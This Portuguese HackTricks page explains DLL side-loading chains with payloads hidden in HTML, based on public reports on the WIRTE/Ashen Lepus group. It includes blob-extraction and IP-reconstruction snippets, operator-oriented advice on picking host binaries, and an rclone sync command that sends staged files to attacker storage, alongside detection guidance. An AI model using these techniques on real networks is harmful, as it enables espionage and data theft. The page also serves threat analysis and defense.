# Side-Loading avançado de DLL com preparação de payload incorporado em HTML

{{#include ../../../banners/hacktricks-training.md}}

## Visão geral da operação

Ashen Lepus (também conhecido como WIRTE) weaponized um padrão repetível que encadeia DLL sideloading, payloads HTML em estágios e backdoors .NET modulares para persistir em redes diplomáticas do Oriente Médio. A técnica pode ser reutilizada por qualquer operador porque depende de:<sup>[[1]](#references)</sup>

- **Engenharia social baseada em arquivos compactados**: PDFs aparentemente benignos instruem os alvos a baixar um arquivo RAR de um site de compartilhamento de arquivos. O arquivo inclui um EXE de visualizador de documentos com aparência legítima, uma DLL maliciosa com o nome de uma biblioteca confiável (por exemplo, `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) e um arquivo chamariz `Document.pdf`.
- **Abuso da ordem de pesquisa de DLLs**: a vítima clica duas vezes no EXE, o Windows resolve a importação da DLL a partir do diretório atual e o loader malicioso (AshenLoader) é executado dentro do processo confiável, enquanto o PDF chamariz é aberto para evitar suspeitas.
- **Staging Living-off-the-land**: cada estágio posterior (AshenStager → AshenOrchestrator → módulos) permanece fora do disco até ser necessário e é entregue como blobs criptografados ocultos em respostas HTML aparentemente inofensivas.

## Cadeia de Side-Loading em vários estágios

1. **EXE chamariz → AshenLoader**: o EXE faz side-loading do AshenLoader, que realiza reconhecimento do host, criptografa os dados com AES-CTR e os envia por POST dentro de parâmetros rotativos, como `token=`, `id=`, `q=` ou `auth=`, para caminhos com aparência de API (por exemplo, `/api/v2/account`).<sup>[[1]](#references)</sup>
2. **Extração de HTML**: o C2 só revela o próximo estágio quando o IP do cliente é geolocalizado na região-alvo e o `User-Agent` corresponde ao implant, dificultando a análise por sandboxes. Quando as verificações são aprovadas, o corpo HTTP contém um blob `<headerp>...</headerp>` com o payload AshenStager criptografado em Base64/AES-CTR.
3. **Segundo sideload**: AshenStager é implantado com outro binário legítimo que importa `wtsapi32.dll`. A cópia maliciosa injetada no binário busca mais HTML e, desta vez, extrai `<article>...</article>` para recuperar o AshenOrchestrator.
4. **AshenOrchestrator**: um controlador .NET modular que decodifica uma configuração JSON em Base64. Os campos `tg` e `au` da configuração são concatenados/hash para formar a chave AES, que descriptografa `xrk`. Os bytes resultantes servem como chave XOR para cada blob de módulo buscado posteriormente.
5. **Entrega de módulos**: cada módulo é descrito por meio de comentários HTML que redirecionam o parser para uma tag arbitrária, contornando regras estáticas que procuram apenas por `<headerp>` ou `<article>`. Os módulos incluem persistência (`PR*`), desinstaladores (`UN*`), reconhecimento (`SN`), captura de tela (`SCT`) e exploração de arquivos (`FE`).

### Padrão de análise de contêiner HTML

```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```

Mesmo que os defensores bloqueiem ou removam um elemento específico, o operador só precisa alterar a tag indicada no comentário HTML para retomar a entrega.<sup>[[1]](#references)</sup>

### Auxiliar de Extração Rápida (Python)

```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```

## Paralelos com a evasão por staging em HTML

Pesquisas recentes sobre HTML smuggling (Talos) destacam payloads ocultos como strings Base64 dentro de blocos `<script>` em anexos HTML e decodificados via JavaScript em tempo de execução.<sup>[[2]](#references)</sup> O mesmo truque pode ser reutilizado em respostas C2: armazenar blobs criptografados em uma tag script (ou outro elemento DOM) e decodificá-los em memória antes de aplicar AES/XOR, fazendo a página parecer HTML comum. Talos também mostra ofuscação em camadas (renomeação de identificadores e uso de Base64/Caesar/AES) dentro de tags script, algo que se aplica facilmente a blobs C2 com staging em HTML.<sup>[[2]](#references)</sup> Uma publicação posterior da Talos sobre **salting de texto oculto** também é relevante aqui: dividir Base64 com comentários HTML irrelevantes ou espaços em branco já basta para quebrar extratores regex simples, mantendo trivial a reconstrução no navegador.<sup>[[7]](#references)</sup>

## Notas sobre variantes recentes (2024-2025)

- A Check Point observou campanhas WIRTE em 2024 que ainda dependiam de sideloading baseado em arquivos compactados, mas usavam `propsys.dll` (stagerx64) como primeiro estágio. O stager decodifica o payload seguinte com Base64 + XOR (chave `53`), envia solicitações HTTP com um `User-Agent` codificado diretamente e extrai blobs criptografados incorporados entre tags HTML. Em uma variante, o estágio foi reconstruído a partir de uma longa lista de strings IP incorporadas, decodificadas por `RtlIpv4StringToAddressA` e, em seguida, concatenadas nos bytes do payload.<sup>[[3]](#references)</sup>
- A OWN-CERT documentou ferramentas WIRTE anteriores nas quais o dropper carregado por sideload, `wtsapi32.dll`, protegia strings com Base64 + TEA e usava o próprio nome da DLL como chave de descriptografia; depois, ofuscava dados de identificação do host com XOR/Base64 antes de enviá-los ao C2.<sup>[[4]](#references)</sup>

## Reconstrução de estágios codificados em IP

A variante `propsys.dll` de 2024 do WIRTE mostra que o próximo PE não precisa estar armazenado como um único blob HTML contíguo. O loader pode armazenar bytes do estágio como strings no formato quad-dotted e reconstruí-los com `RtlIpv4StringToAddressA`, um padrão bastante relacionado ao tradecraft **IPfuscation** do Hive.<sup>[[3]](#references)[[5]](#references)</sup> Do ponto de vista operacional, isso é útil quando o ator quer que a página HTML contenha o que parece ser IOCs ou dados de configuração inofensivos, em vez de um payload Base64 óbvio.

```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```

Se os bytes recuperados começarem com `MZ`, provavelmente você reconstruiu diretamente o próximo PE. Caso contrário, verifique se há uma camada inicial de XOR/Base64 ou pequenos blocos delimitadores entre os endereços.

## Nomes de DLL intercambiáveis e rotação de hosts

Uma característica importante desse padrão é que o **backend de staging HTML/AES/XOR pode permanecer idêntico enquanto apenas o par de sideload muda**. O WIRTE alternou entre `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` e `propsys.dll` em diferentes campanhas, o que é útil porque:<sup>[[1]](#references)[[3]](#references)</sup>

- `propsys.dll` e `wtsapi32.dll` são nomes comuns de DLLs do Windows que os defensores esperam encontrar em `%System32%` / `%SysWOW64%`.
- Catálogos públicos, como **HijackLibs**, já mapeiam muitos binários que carregam essas DLLs a partir do diretório de um aplicativo copiado, oferecendo aos operadores hosts substitutos sem que precisem redesenhar o stager.
- Apenas a superfície de exportação precisa ser adaptada para cada host. O parser HTML, as rotinas AES/XOR e o carregador de módulos geralmente podem ser transferidos sem alterações para uma DLL proxy de encaminhamento.

Para atividades em um laboratório ofensivo, isso significa que você pode dividir o problema em **(1) encontrar um host assinado e estável que resolva localmente o nome da DLL escolhido** e **(2) reutilizar a mesma lógica de carregamento de HTML staged por trás dessa DLL**.

## Hardening de criptografia e C2

- **AES-CTR em toda parte**: os loaders atuais incorporam chaves de 256 bits e nonces (por exemplo, `{9a 20 51 98 ...}`) e, opcionalmente, adicionam uma camada XOR usando strings como `msasn1.dll` antes/depois da descriptografia.<sup>[[1]](#references)</sup>
- **Variações do material de chave**: loaders anteriores usavam Base64 + TEA para proteger strings incorporadas, com a chave de descriptografia derivada do nome da DLL maliciosa (por exemplo, `wtsapi32.dll`).<sup>[[4]](#references)</sup>
- **Separação da infraestrutura + camuflagem de subdomínios**: os servidores de staging são separados por ferramenta, hospedados em diferentes ASNs e, às vezes, ficam atrás de subdomínios com aparência legítima, para que o comprometimento de um estágio não exponha os demais.
- **Ocultação de reconhecimento**: os dados enumerados agora incluem listagens de Program Files para identificar aplicativos de alto valor e são sempre criptografados antes de saírem do host.
- **Rotação de URIs**: parâmetros de consulta e caminhos REST mudam entre campanhas (`/api/v1/account?token=` → `/api/v2/account?auth=`), invalidando detecções frágeis.
- **Fixação de User-Agent + redirecionamentos seguros**: a infraestrutura de C2 responde apenas a strings exatas de UA e, caso contrário, redireciona para sites legítimos de notícias/saúde para se misturar ao tráfego normal.
- **Entrega condicionada**: os servidores são restritos geograficamente e só respondem a implants reais. Clientes não aprovados recebem HTML sem suspeitas.

## Persistência e ciclo de execução

O AshenStager cria tarefas agendadas que se fazem passar por trabalhos de manutenção do Windows e são executadas via `svchost.exe`, por exemplo:<sup>[[1]](#references)</sup>

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Essas tarefas reiniciam a cadeia de sideload na inicialização ou em intervalos regulares, permitindo que o AshenOrchestrator solicite novos módulos sem precisar gravar novamente no disco.

## Uso de clientes de sincronização legítimos para exfiltração

Os operadores colocam documentos diplomáticos em `C:\Users\Public` (legível por todos e sem aparência suspeita) por meio de um módulo dedicado e, em seguida, baixam o binário legítimo do [Rclone](https://rclone.org/) para sincronizar esse diretório com o armazenamento do atacante. A Unit42 observa que esta é a primeira vez que o ator foi visto usando o Rclone para exfiltração, em linha com a tendência mais ampla de abusar de ferramentas legítimas de sincronização para se misturar ao tráfego normal:<sup>[[1]](#references)</sup>

1. **Preparar**: copiar/coletar os arquivos-alvo em `C:\Users\Public\{campaign}\`.
2. **Configurar**: distribuir uma configuração do Rclone apontando para um endpoint HTTPS controlado pelo atacante (por exemplo, `api.technology-system[.]com`).
3. **Sincronizar**: executar `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` para que o tráfego se pareça com backups normais na nuvem.

Como o Rclone é amplamente usado em fluxos legítimos de backup, os defensores devem se concentrar em execuções anômalas (novos binários, remotos incomuns ou sincronização repentina de `C:\Users\Public`).

## Pontos de detecção

- Gere alertas para **processos assinados** que carregam inesperadamente DLLs de caminhos graváveis pelo usuário (filtros do Procmon + `Get-ProcessMitigation -Module`), especialmente quando os nomes das DLLs incluem `netutils`, `srvcli`, `dwampi`, `wtsapi32` ou `propsys`.<sup>[[6]](#references)</sup>
- Inspecione respostas HTTPS suspeitas em busca de **grandes blobs Base64 incorporados em tags incomuns** ou protegidos por comentários `<!-- TAG: <xyz> -->`.
- Normalize o HTML primeiro: **remova os comentários e reduza os espaços em branco antes da extração de Base64**, pois a evasão por salting de texto oculto pode dividir payloads entre limites de comentários.
- Amplie a busca em HTML para incluir **strings Base64 dentro de blocos `<script>`** (staging no estilo HTML smuggling) que são decodificadas por JavaScript antes do processamento AES/XOR.
- Procure chamadas repetidas a **`RtlIpv4StringToAddressA` seguidas pela montagem de buffers**, especialmente quando as strings próximas forem longas listas de endereços IPv4, em vez de alvos de rede reais.
- Procure **tarefas agendadas** que executem `svchost.exe` com argumentos que não sejam de serviço ou apontem para diretórios do dropper.
- Monitore **redirecionamentos de C2** que só retornam payloads para strings exatas de `User-Agent` e, caso contrário, redirecionam para domínios legítimos de notícias/saúde.
- Monitore o aparecimento de binários do **Rclone** fora de locais gerenciados pela equipe de TI, novos arquivos `rclone.conf` ou tarefas de sincronização que busquem dados em diretórios de staging, como `C:\Users\Public`.

## References

- [1] [Ashen Lepus, afiliado ao Hamas, tem como alvo entidades diplomáticas do Oriente Médio com a nova suíte de malware AshTag](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [2] [Oculto entre as tags: insights sobre técnicas de evasão em HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [3] [O ator de ameaças WIRTE, afiliado ao Hamas, continua suas operações no Oriente Médio e passa a realizar atividades disruptivas](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [4] [WIRTE: em busca do tempo perdido](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [5] [Hive Ransomware usa uma nova técnica de IPfuscation para evitar detecção](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [6] [Possível sideload de DLLs do sistema a partir de locais que não são do sistema](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
- [7] [Adicionando salting de texto oculto às ameaças por e-mail](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)
{{#include ../../../banners/hacktricks-training.md}}
